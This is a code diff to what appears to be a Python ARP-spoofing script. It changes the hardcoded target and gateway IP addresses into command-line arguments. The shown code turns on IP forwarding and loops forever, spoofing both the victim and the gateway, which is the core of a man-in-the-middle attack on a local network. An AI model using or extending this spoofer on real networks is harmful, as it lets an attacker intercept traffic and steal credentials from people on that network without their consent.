@@ -5,8 +5,8 @@ import time
 import sys
 import subprocess
 
-target_ip="10.0.2.6"
-gateway_ip = "10.0.2.1"
+#target_ip="10.0.2.6"
+#gateway_ip = "10.0.2.1"
 
 def get_arguments():
     parser = optparse.OptionParser()
@@ -45,6 +45,11 @@ def restore(destination_ip, source_ip):
 try:
     subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward ", shell=True)
     sent_packets_counts = 0
+    options = get_arguments()
+
+    target_ip = options.target_ip
+    gateway_ip = options.gateway_ip
+
     while True:
         spoof(target_ip, gateway_ip)
         spoof(gateway_ip, target_ip)
